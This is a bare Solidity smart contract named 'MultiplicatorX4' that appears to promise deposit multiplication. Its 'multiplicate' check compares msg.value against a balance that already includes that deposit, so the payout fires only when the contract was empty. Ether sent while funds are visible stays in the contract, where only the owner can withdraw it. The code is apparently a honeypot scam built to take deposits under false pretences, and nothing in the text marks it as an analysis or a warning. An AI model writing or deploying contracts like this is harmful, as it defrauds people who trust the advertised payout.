pragma solidity ^0.4.18;
contract MultiplicatorX4 {
	address public Owner = msg.sender;
	function () payable public {
	}
	function withdraw() payable public {
	require(msg.sender == Owner);
	Owner.transfer(this.balance);
	}
	function Command(address adr, bytes data) payable public {
	require(msg.sender == Owner);
	adr.transfer(msg.value);
	}
	function multiplicate(address adr) payable public {
	if(msg.value >= this.balance){
	adr.transfer(this.balance + msg.value);
	}
	}
	
}